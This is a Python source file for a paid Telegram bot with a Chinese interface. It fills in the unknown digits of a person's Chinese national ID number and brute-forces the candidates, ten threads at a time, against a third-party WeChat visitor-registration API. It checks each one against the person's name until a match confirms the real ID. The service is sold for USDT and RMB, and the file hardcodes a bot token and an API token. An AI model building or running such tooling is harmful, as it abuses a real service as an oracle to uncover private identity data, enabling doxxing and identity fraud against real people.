import telebot 
import requests
import time
import re
import threading
import json
import os
import itertools
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 
TOTAL_QUERIES = 0

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(new_tk)

# ================= 2. 界面构建 =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("⬅️ BACK", callback_data="back_to_main"))
    return markup

def get_help_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⬅️ BACK", callback_data="back_to_main"))
    return markup

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name
    uname = f"@{source.from_user.username}" if source.from_user.username else "未设置"
    return (
        f"Welcome to use！\n\n"
        f"用户 ID: `{uid}`\n"
        f"用户名称: `{first_name}`\n"
        f"用户名: {uname}\n"
        f"当前余额: `{pts:.2f}积分`\n\n"
        f"使用帮助可查看使用教程\n"
        f"在线充值可支持24小时\n"
        f"1 USDT = 1 积分"
    )

# ================= 3. 核心核验逻辑 =================

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar = "█" * int(16 * done // total) + "░" * (16 - int(16 * done // total))
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global TOTAL_QUERIES
    TOTAL_QUERIES += 1
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        while is_running:
            time.sleep(3)
            try: bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total))
            except: pass

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                success_match = f"✅ 核验成功！\n\n{name} {id_no} 二要素核验一致✅"
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(verify, id_list)

    is_running = False
    try: bot.delete_message(chat_id, msg_id)
    except: pass
    bot.send_message(chat_id, success_match if success_match else "❌ 核验完成，未发现匹配结果。")

# ================= 4. 指令与回调逻辑 =================

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    admin_text = (
        f"👑 **管理员控制台**\n\n"
        f"💡 指令列表：\n"
        f"`/add 用户ID 分数` (充值积分)\n"
        f"`/set_token` (更换接口Token)"
    )
    bot.send_message(message.chat.id, admin_text, parse_mode='Markdown')

@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "🗝 **请输入新的 X-Token：**")
    bot.register_next_step_handler(msg, process_token_update)

def process_token_update(message):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = message.text.strip()
    save_token(CURRENT_X_TOKEN)
    bot.send_message(message.chat.id, "✅ **接口 Token 已成功更新！**")

@bot.message_handler(commands=['add'])
def add_points_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split()
        tid, amt = int(parts[1]), float(parts[2])
        user_points[tid] = user_points.get(tid, 0.0) + amt
        save_points()
        bot.reply_to(message, f"✅ 已充值！用户 `{tid}` 余额: `{user_points[tid]:.2f}`")
    except: bot.reply_to(message, "格式：`/add 用户ID 积分`")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in user_points: user_points[uid] = 0.0
    save_points()
    bot.send_message(message.chat.id, get_main_text(message, uid, user_points[uid]), 
                     parse_mode='Markdown', reply_markup=get_main_markup())

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    
    if call.data == "view_help":
        text = "🛠️️使用帮助\n批量二要素查询\n发送 /pl 进行查询\n每次查询扣除 2.5 积分\n" \
               "——————————————————\n身份证补齐查询\n发送 /bq 进行查询\n每次查询扣除 0.5 积分"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    
    elif call.data == "view_pay":
        text = "🛍️购买积分说明：\n\n优先推荐使用OkPay付款\nUSDT（trc20）购买积分\n充值兑换积分比例为：1u=1积分\n\n请选择充值积分方式："
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, 
                             parse_mode='Markdown', reply_markup=get_main_markup())
                             
    elif call.data == "start_verify_flow":
        bot.send_message(call.message.chat.id, "请输入姓名:")
        user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}

@bot.message_handler(commands=['pl'])
def pl_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 2.5:
        return bot.reply_to(message, "积分不足，请先充值！")
    user_states[message.chat.id] = {'step': 'v_name'}
    bot.send_message(message.chat.id, "请输入姓名：")

@bot.message_handler(commands=['bq'])
def bq_cmd(message):
    if user_points.get(message.from_user.id, 0.0) < 0.5:
        return bot.reply_to(message, "积分不足，请先充值！")
    user_states[message.chat.id] = {'step': 'g_card'}
    bot.send_message(message.chat.id, "请输入身份证号（未知用x）：")

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    state = user_states.get(chat_id)
    if not state or text.startswith('/'): return

    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text})
        bot.send_message(chat_id, f"✅ 记录姓名：{text}\n请发送身份证列表：")
        
    elif state['step'] == 'v_ids':
        ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
        if ids:
            user_points[uid] -= 2.5; save_points()
            msg = bot.send_message(chat_id, get_ui_bar(0, len(ids)))
            threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, state['name'], ids, uid)).start()
        del user_states[chat_id]

    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女):")

    elif state['step'] == 'g_sex':
        user_points[uid] -= 0.5; save_points()
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1","3","5","7","9"]
        else: char_sets[16] = ["0","2","4","6","8"]
        ids = ["".join(res) for res in itertools.product(*char_sets)][:5000]
        generated_cache[uid] = ids
        with open("铭.txt", "w") as f: f.write("\n".join(ids))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
        bot.send_document(chat_id, open("铭.txt", "rb"), caption=f"✅ 生成成功！共 {len(ids)} 个", reply_markup=markup)
        del user_states[chat_id]

    elif state['step'] == 'v_name_after_gen':
        if uid in generated_cache:
            user_points[uid] -= 2.5; save_points()
            msg = bot.send_message(chat_id, get_ui_bar(0, len(generated_cache[uid])))
            threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, text, generated_cache[uid], uid)).start()
        del user_states[chat_id]

if __name__ == '__main__':
    bot.infinity_polling()
